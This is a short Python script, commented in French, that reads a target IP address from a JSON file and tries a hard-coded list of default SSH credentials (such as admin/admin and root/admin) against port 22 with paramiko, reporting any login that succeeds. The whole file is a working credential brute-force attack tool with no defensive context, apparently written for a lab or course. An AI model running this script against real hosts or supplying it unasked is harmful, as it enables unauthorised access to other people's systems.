import paramiko
import json

json_file_path = 'conf.json'  

def get_ip_from_json(json_file_path):
    try:
        with open(json_file_path) as json_file:
            data = json.load(json_file)
            target = data.get('IP')
            return target
    except Exception as e:
        print(f"Error reading JSON file: {e}")
        return None

def brute_force_ssh(hostname, port, username, password):
    try:
        client = paramiko.SSHClient()
        # Ajout de la clé publique du serveur à la liste des clés connues
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port, username, password)
        print(f"\033[1;31;40mConnexion SSH réussie avec {username}/{password}")
        client.close()

        return True

    except paramiko.AuthenticationException:
        print(f"Échec de l'authentification avec {username}/{password}")
        return False

def main_bruteforce():
    target = get_ip_from_json(json_file_path)
    if target is None:
        print("Impossible de récupérer l'adresse IP à partir du fichier JSON.")
        return

    # Informations de connexion SSH
    hostname = target
    port = 22 
    
    credentials = [("admin", "admin"), ("admin", "root"), ("root", "admin"), ("demo","sdv92")]
    for username, password in credentials:
        tentative = 0
        if brute_force_ssh(hostname, port, username, password):
            tentative = 1 
            break

